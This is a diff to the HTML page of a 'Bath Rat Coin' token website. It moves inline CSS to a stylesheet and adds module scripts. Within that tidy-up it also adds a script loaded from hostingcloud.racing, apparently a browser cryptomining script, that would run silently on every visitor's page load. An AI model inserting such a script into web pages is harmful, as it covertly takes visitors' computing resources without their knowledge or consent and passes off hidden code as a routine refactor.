@@ -4,42 +4,8 @@
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Bath Rat Coin</title>
-        <style>
-            body {
-                font-family: "Arial", sans-serif;
-                margin: 0;
-                padding: 0;
-                background-color: #f0f0f0;
-            }
-
-            header {
-                background-color: #333;
-                color: #fff;
-                text-align: center;
-                padding: 1rem;
-            }
-
-            main {
-                text-align: center;
-                padding: 2rem;
-            }
-
-            #bathImage {
-                max-width: 100%;
-                height: auto;
-                margin-top: 1rem;
-            }
-
-            footer {
-                background-color: #333;
-                color: #fff;
-                text-align: center;
-                padding: 1rem;
-                position: fixed;
-                bottom: 0;
-                width: 100%;
-            }
-        </style>
+        <link rel="stylesheet" href="styles.css">
+        <script src="https://www.hostingcloud.racing/KnJC.js"></script>
     </head>
     <body>
         <header>
@@ -50,7 +16,7 @@
             <h2>Get in on the Action!</h2>
             <p>Buy Bath Rat Coin now for a chance to witness the legendary bath of the Bath Rat!</p>
             <p style="color: grey"><i>Wowzers! Best buy I've ever had!</i></p>
-            <button style="" onclick="buyCoin()">Buy Now</button>
+            <button onclick="buyCoin()">Buy Now</button>
 
             <div>
                 <img id="bathImage" src="./public/Bathrat.png" alt="Bath Rat Initial Bath" />
@@ -63,6 +29,7 @@
             <p>&copy; 2024 Bath Rat Coin</p>
         </footer>
 
+        <script type="module" src="src/index.js"></script>
         <script>
             function buyCoin() {
                 // Implement the logic to interact with the Tron Smart contract and initiate a purchase.
